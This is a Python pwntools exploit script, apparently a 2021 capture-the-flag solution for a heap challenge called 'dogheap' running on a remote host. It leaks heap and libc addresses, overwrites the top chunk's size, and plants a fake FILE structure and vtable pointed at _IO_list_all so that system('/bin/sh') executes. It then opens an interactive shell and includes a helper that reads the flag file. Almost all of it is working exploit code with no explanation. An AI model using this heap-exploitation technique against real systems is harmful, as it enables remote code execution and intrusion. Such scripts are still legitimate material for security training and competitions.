# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './dogheap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
context.log_level = 'debug' 
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '47.108.195.119'
    port = '20141'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size,name):
    cmd(1)
    sla('size of it',size)
    sa('Name?' , name)

def edit(size,name):
    cmd(2)
    sla('size of it',size)
    sa('name' , name)

def show():
    cmd(3)

# one_gad = one_gadget(libc.path)

def attack():
    
    sla('名称:','A1natas')
    sla('名字:','Niyah')
    ru('0x')
    heap_base = rint() - 0x10


    add(0x18,'a')
    edit(0x20 , flat(0,0,0,0xfc1))
    add(0x1000,'a')

    add(0x18,'\x88')

    show()
    leak = l64()
    libc.address = leak - 0x3c5188 
    system_addr = libc.sym['system']

    # IO_list_all =libc.sym['_IO_list_all']
    _IO_list_all = libc.address + 0x3c5520
    vtable_addr = heap_base + 0x530 - 8

    fake_vtable_addr = heap_base + 0x60 + 0xd8 + 8
    unsortedbin = '\x00'*0x10 + '/bin/sh\x00'+p64(0x61)
    unsortedbin += p64(0xdeadbeef) + p64(_IO_list_all - 0x10)
    unsortedbin += p64(0) + p64(1)
    unsortedbin = unsortedbin.ljust(0x10+0xd8,'\x00') + p64(fake_vtable_addr)
    fake_vtable = p64(0)*3 + p64(system_addr)

    payload = unsortedbin + fake_vtable

    edit( 0x200 , payload)

    lg('libc.address',libc.address)
    lg('heap_base',heap_base)

    # dbg('malloc')
    cmd(1)
    sla('size of it',0x20)
    # dbg()



    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   dogheap.py
@Time    :   2021/11/27 09:57:48
@Author  :   Niyah 
'''